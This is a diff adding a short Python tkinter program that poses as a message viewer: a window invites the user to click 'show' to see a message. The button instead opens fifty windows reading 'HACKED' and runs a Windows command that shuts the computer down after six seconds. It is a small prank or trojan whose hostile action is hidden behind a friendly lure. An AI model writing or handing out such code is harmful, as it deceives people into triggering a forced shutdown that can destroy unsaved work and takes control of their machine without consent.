@@ -1,0 +1,38 @@
+from tkinter import * 
+import os
+
+root = Tk()
+root.geometry("300x265")
+root.maxsize(350,300)
+root.configure(bg="light blue")
+root.title("massage")
+#shutdown function with os module
+def shutdown():
+    return os.system("shutdown /s /t 6")
+
+def winloop():
+    for i in range(50):
+        root1=Tk()
+        root1.geometry("400x50")
+        lb=Label(root1,text="HACKED" ,font=60).pack()
+
+
+
+#creating frame
+f1=Frame(root,bg="grey",borderwidth=4,relief=SUNKEN)
+f1.pack(side=LEFT)
+#creat labels
+lbl=Label(text="hello..i send a message for you ",font="bold 10")
+lbl.pack()
+
+lbl2=Label(text="please click on show button to see the massage",font="bold 10")
+lbl2.pack(pady=12)
+
+#creating buttons 
+b1=Button(root,text="show",fg="red",bg="light green",command=lambda:[winloop(),shutdown()])
+b1.pack(side=LEFT,padx=30)
+
+b2=Button(root,text="exit",fg="red",command=lambda:exit())
+b2.pack(side=RIGHT,padx=30)
+
+root.mainloop()
